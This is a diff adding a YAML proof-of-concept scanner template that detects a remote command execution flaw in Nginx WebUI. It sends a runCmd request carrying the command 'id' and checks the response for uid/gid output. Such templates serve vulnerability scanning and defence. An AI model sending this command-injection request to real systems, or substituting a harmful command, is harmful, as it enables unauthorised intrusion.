@@ -1,0 +1,19 @@
+id: poc-yaml-nginxwebui-rce
+info:
+  name: Nginx WebUI runCmd 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: Nginx
+variables:
+  path: '/AdminPage/conf/runCmd?cmd=id
+
+    /AdminPage/about'
+requests:
+- method: GET
+  path: '{{.path}}'
+  expression: "(\n  contains(title, \"nginxWebUI\") || contains(body, \"confStr.jserror2\
+    \ = \\\"nginx.conf\")\n) || (\n  contains(body, \"运行失败\") && contains(body, \"\
+    <br>uid=\") && contains(body, \"gid=\")\n)\n"
+transport: http
